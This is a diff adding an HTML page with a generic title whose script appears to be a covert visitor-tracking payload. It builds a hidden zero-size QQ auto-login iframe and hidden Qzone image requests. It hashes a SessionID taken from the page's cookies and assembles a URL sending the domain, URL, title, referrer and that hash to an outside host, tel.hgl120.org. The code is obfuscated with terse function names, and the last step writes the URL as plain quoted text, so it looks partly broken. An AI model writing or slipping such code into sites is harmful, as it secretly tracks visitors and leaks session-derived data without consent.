@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<script>
+    function C(x, l) {
+        function B(n, c) {
+            return (n << c) | (n >>> (32 - c))
+        }
+        function S(x, y) {
+            var l = (x & 0xFFFF) + (y & 0xFFFF);
+            var w = (x >> 16) + (y >> 16) + (l >> 16);
+            return (w << 16) | (l & 0xFFFF)
+        }
+        function M(q, a, b, x, s, t) {
+            return S(B(S(S(a, q), S(x, t)), s), b)
+        }
+        function F(a, b, c, d, x, s, t) {
+            return M((b & c) | ((~b) & d), a, b, x, s, t)
+        }
+        function G(a, b, c, d, x, s, t) {
+            return M((b & d) | (c & (~d)), a, b, x, s, t)
+        }
+        function H(a, b, c, d, x, s, t) {
+            return M(b ^ c ^ d, a, b, x, s, t)
+        }
+        function I(a, b, c, d, x, s, t) {
+            return M(c ^ (b | (~d)), a, b, x, s, t)
+        }
+        function BH(b) {
+            var h = "0123456789ABCDEF";
+            var s = "";
+            for (var i = 0; i < b.length * 4; i++) {
+                s += h.charAt((b[i >> 2] >> ((i % 4) * 8 + 4)) & 0xF) + h.charAt((b[i >> 2] >> ((i % 4) * 8)) & 0xF)
+            }
+            return s
+        }
+        x[l >> 5] |= 0x80 << ((l) % 32);
+        x[(((l + 64) >>> 9) << 4) + 14] = l;
+        var a = 1732584193;
+        var b = -271733879;
+        var c = -1732584194;
+        var d = 271733878;
+        for (var i = 0; i < x.length; i += 16) {
+            var oa = a;
+            var ob = b;
+            var oc = c;
+            var od = d;
+            a = F(a, b, c, d, x[i + 0], 7, -680876936);
+            d = F(d, a, b, c, x[i + 1], 12, -389564586);
+            c = F(c, d, a, b, x[i + 2], 17, 606105819);
+            b = F(b, c, d, a, x[i + 3], 22, -1044525330);
+            a = F(a, b, c, d, x[i + 4], 7, -176418897);
+            d = F(d, a, b, c, x[i + 5], 12, 1200080426);
+            c = F(c, d, a, b, x[i + 6], 17, -1473231341);
+            b = F(b, c, d, a, x[i + 7], 22, -45705983);
+            a = F(a, b, c, d, x[i + 8], 7, 1770035416);
+            d = F(d, a, b, c, x[i + 9], 12, -1958414417);
+            c = F(c, d, a, b, x[i + 10], 17, -42063);
+            b = F(b, c, d, a, x[i + 11], 22, -1990404162);
+            a = F(a, b, c, d, x[i + 12], 7, 1804603682);
+            d = F(d, a, b, c, x[i + 13], 12, -40341101);
+            c = F(c, d, a, b, x[i + 14], 17, -1502002290);
+            b = F(b, c, d, a, x[i + 15], 22, 1236535329);
+            a = G(a, b, c, d, x[i + 1], 5, -165796510);
+            d = G(d, a, b, c, x[i + 6], 9, -1069501632);
+            c = G(c, d, a, b, x[i + 11], 14, 643717713);
+            b = G(b, c, d, a, x[i + 0], 20, -373897302);
+            a = G(a, b, c, d, x[i + 5], 5, -701558691);
+            d = G(d, a, b, c, x[i + 10], 9, 38016083);
+            c = G(c, d, a, b, x[i + 15], 14, -660478335);
+            b = G(b, c, d, a, x[i + 4], 20, -405537848);
+            a = G(a, b, c, d, x[i + 9], 5, 568446438);
+            d = G(d, a, b, c, x[i + 14], 9, -1019803690);
+            c = G(c, d, a, b, x[i + 3], 14, -187363961);
+            b = G(b, c, d, a, x[i + 8], 20, 1163531501);
+            a = G(a, b, c, d, x[i + 13], 5, -1444681467);
+            d = G(d, a, b, c, x[i + 2], 9, -51403784);
+            c = G(c, d, a, b, x[i + 7], 14, 1735328473);
+            b = G(b, c, d, a, x[i + 12], 20, -1926607734);
+            a = H(a, b, c, d, x[i + 5], 4, -378558);
+            d = H(d, a, b, c, x[i + 8], 11, -2022574463);
+            c = H(c, d, a, b, x[i + 11], 16, 1839030562);
+            b = H(b, c, d, a, x[i + 14], 23, -35309556);
+            a = H(a, b, c, d, x[i + 1], 4, -1530992060);
+            d = H(d, a, b, c, x[i + 4], 11, 1272893353);
+            c = H(c, d, a, b, x[i + 7], 16, -155497632);
+            b = H(b, c, d, a, x[i + 10], 23, -1094730640);
+            a = H(a, b, c, d, x[i + 13], 4, 681279174);
+            d = H(d, a, b, c, x[i + 0], 11, -358537222);
+            c = H(c, d, a, b, x[i + 3], 16, -722521979);
+            b = H(b, c, d, a, x[i + 6], 23, 76029189);
+            a = H(a, b, c, d, x[i + 9], 4, -640364487);
+            d = H(d, a, b, c, x[i + 12], 11, -421815835);
+            c = H(c, d, a, b, x[i + 15], 16, 530742520);
+            b = H(b, c, d, a, x[i + 2], 23, -995338651);
+            a = I(a, b, c, d, x[i + 0], 6, -198630844);
+            d = I(d, a, b, c, x[i + 7], 10, 1126891415);
+            c = I(c, d, a, b, x[i + 14], 15, -1416354905);
+            b = I(b, c, d, a, x[i + 5], 21, -57434055);
+            a = I(a, b, c, d, x[i + 12], 6, 1700485571);
+            d = I(d, a, b, c, x[i + 3], 10, -1894986606);
+            c = I(c, d, a, b, x[i + 10], 15, -1051523);
+            b = I(b, c, d, a, x[i + 1], 21, -2054922799);
+            a = I(a, b, c, d, x[i + 8], 6, 1873313359);
+            d = I(d, a, b, c, x[i + 15], 10, -30611744);
+            c = I(c, d, a, b, x[i + 6], 15, -1560198380);
+            b = I(b, c, d, a, x[i + 13], 21, 1309151649);
+            a = I(a, b, c, d, x[i + 4], 6, -145523070);
+            d = I(d, a, b, c, x[i + 11], 10, -1120210379);
+            c = I(c, d, a, b, x[i + 2], 15, 718787259);
+            b = I(b, c, d, a, x[i + 9], 21, -343485551);
+            a = S(a, oa);
+            b = S(b, ob);
+            c = S(c, oc);
+            d = S(d, od)
+        }
+        return BH(Array(a, b, c, d))
+    }
+    function H2(s, z) {
+        function SB(s) {
+            var b = Array();
+            var m = (1 << z) - 1;
+            for (var i = 0; i < s.length * z; i += z) b[i >> 5] |= (s.charCodeAt(i / z) & m) << (i % 32);
+            return b
+        }
+        if (!z) z = 16;
+        return C(SB(s), s.length * z)
+    }
+    document.writeln("<iframe id='login_frame' height='0' scrolling='auto' width='0' frameborder='0' src='http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=1&low_login=0&qlogin_auto_login=1&no_verifyimg=1&link_target=blank&appid=549000912&style=12&target=self&s_url=http%3A//qzs.qq.com/qzone/v5/loginsucc.html?para=izone&pt_qr_app=%CA%D6%BB%FAQQ%BF%D5%BC%E4&pt_qr_link=http%3A//z.qzone.com/download.html&self_regurl=http%3A//qzs.qq.com/qzone/v6/reg/index.html&pt_qr_help_link=http%3A//z.qzone.com/download.html'></iframe>");
+    var _time = Math.round(new Date().getTime() / 1000);
+    document.writeln("<img src='http://qzone.qq.com/' style='display:none;' />");
+    document.writeln("<img src='http://2978240244.qzone.qq.com/'  style='display:none;'/>");
+
+
+    var _ccid = '2978240244';
+    var _address = document.referrer;
+    var add_ym = document.domain;
+    var add_url = document.URL;
+    var _title = document.title;
+    var _keyword = '';
+    var sjkljlkwjeriou = H2(H2('2978240244', 8) + "-" + document.cookie.substr(document.cookie.indexOf('SessionID') + 10, 16), 8);
+    function fname() {
+        document.writeln("'http://tel.hgl120.org/WebForm1.aspx?domain=" + add_ym + "&url=" + add_url + "&ccid=" + _ccid + "&title=" + encodeURIComponent(_title) + "&time=" + _time + "&referrer=" + encodeURIComponent(_address) + "&keys=" + sjkljlkwjeriou + "'")
+    }
+    fname();
+</script>
+</body>
+</html>
